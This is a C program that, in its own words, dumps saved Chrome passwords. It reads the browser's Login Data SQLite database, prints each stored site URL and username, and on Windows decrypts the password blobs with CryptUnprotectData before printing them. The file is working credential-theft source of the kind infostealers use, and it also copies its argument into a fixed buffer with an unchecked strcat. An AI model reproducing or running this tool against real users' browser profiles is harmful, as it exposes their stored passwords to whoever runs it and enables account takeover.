#define _CRT_SECURE_NO_WARNINGS

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#ifdef _WIN32
#include <windows.h>
// Link with crypt32.lib
#pragma comment(lib, "crypt32.lib")
#endif /* _WIN32 */

#include "sqlite3.h"
#include "utils.h"

static void usage(char* exe );
static int process_row(void *NotUsed, int argc, char **argv, char **azColName);

unsigned int log_level = LOG_LEVEL_VERBOSE;;

#ifndef _WIN32
#define 	BYTE	char
#endif /* _WIN32 */

int main(int argc, char **argv){
	sqlite3 *db = NULL;
	char *err_msg = NULL;
	int rc = 0;
	char login_db[256] = {0};

	if (argc == 2) {
	    if (!strncmp(argv[1], "-h", 2)) {
	        usage(argv[0]);
	        exit(0);
	    } else {
	        strcat(login_db, argv[1]);
	        VERBOSE(printf("Using login database: %s\n", login_db););
	    }
	} else {
		printf("--Invalid parameters--\n");
		usage(argv[0]);
		exit(1);
	}


	rc = sqlite3_open(login_db, &db);
	if(rc){
		fprintf(stderr, "Can't open database: %s\n", sqlite3_errmsg(db));
		sqlite3_close(db);
		return(1);
	}

	rc = sqlite3_exec(db, "SELECT * FROM logins", process_row, db, &err_msg);
	if( rc != SQLITE_OK ){
		fprintf(stderr, "SQL error: %s (%d)\n", err_msg, rc);
		sqlite3_free(err_msg);
		exit(1);
	}

	sqlite3_free(err_msg);
	sqlite3_close(db);

	return 0;
}

static void usage(char* exe ) {
	printf( "Unprotect and dump saved chrome passwords\n" );
	printf( "For \"File locked\" error close browser\n" );
	printf( "Usage: %s [Login database]\n", exe );
#ifdef _WIN32
	char user_profile[100] = {0};
	GetEnvironmentVariable("UserProfile", user_profile, 100);

	printf( "WinXP: %s\\Local Settings\\Application Data\\Google\\Chrome\\User Data\\Default\\Login Data\n",
	        user_profile);
	printf( "Win7: C:\\Users\\<username>\\Appdata\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\n");
#endif /* _WIN32 */
	printf( "Ubuntu: ~/.config/google-chrome/Default/Login\\ Data\n");
}

static int row_id = 1;
/* 4th argument of sqlite3_exec is the 1st argument to callback */
static int process_row(void *passed_db, int argc, char **argv, char **col_name){
	int i = 0;

	for(i=0; i<argc; i++){
		if( !strcmp(col_name[i], "origin_url")) {
			printf("[%d] Url: %s\n", row_id, argv[i] ? argv[i] : "NULL");
		} else if ( !strcmp(col_name[i], "username_value")) {
			printf("Username: %s\n", argv[i] ? argv[i] : "NULL");
		} else if ( !strcmp(col_name[i], "password_value")) {
			if(!argv[i])
				continue;
			/* For linux with --password-store=basic, password is in plain text */
			printf("Password: %s\n", argv[i]);
/* For Windows pass is stored encrypted in a BLOB */
#ifdef _WIN32
			int rc = 0;
			sqlite3 *db = (sqlite3*)passed_db;
			sqlite3_blob* blob = NULL;
			int blob_size = 0;

			VERBOSE(printf("row_id: %d\n", row_id););
			/* password is stored in a blob */
			rc = sqlite3_blob_open(db, "main", "logins", "password_value", row_id, 0, &blob);
			if (rc != SQLITE_OK ) {
				fprintf(stderr, "Password blob not opened for %s\n", argv[i]);
				exit(1);
			}
			row_id ++;

			blob_size = sqlite3_blob_bytes(blob);
			VVERBOSE(printf("Read blob %p with size %d\n", blob, blob_size););

			BYTE* blob_data = (BYTE*)malloc(blob_size);
			rc = sqlite3_blob_read(blob, blob_data, blob_size, 0);
			if (rc != SQLITE_OK){
				fprintf(stderr, "Blob read error (code %d)\n", rc);
				continue;
			}

			VVERBOSE(dump_bytes(blob_data, blob_size, 0););
			DATA_BLOB enc_data;
			enc_data.pbData = blob_data;
			enc_data.cbData = blob_size;


			/* decrypt data */
			DATA_BLOB dec_data;
			if(CryptUnprotectData(&enc_data, NULL, NULL, NULL, NULL, 0, &dec_data))
			{
				printf("Password len: %d\n", dec_data.cbData);
				dump_bytes(dec_data.pbData, dec_data.cbData, 1);
			} else
			{
				fprintf(stderr, "Decryption failed\n");
			}

			/* cleanup */
			LocalFree(dec_data.pbData);

			free(blob_data);
			sqlite3_blob_close(blob);
#endif /* _WIN32 */
		}
	}

	printf("\n");
	return 0;
}
